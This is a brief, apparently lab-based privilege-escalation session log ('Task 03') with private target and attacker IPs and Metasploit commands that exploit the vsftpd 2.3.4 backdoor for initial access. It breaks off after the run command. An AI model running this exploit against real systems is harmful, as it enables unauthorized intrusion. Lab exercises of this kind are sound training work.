# PrivEsc Session Log – Task 03

## Target Details
- Target IP: `192.168.75.131`
- Attacker IP: `192.168.75.135`

---

## 1) Initial Access (Metasploit)
```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.75.131
run
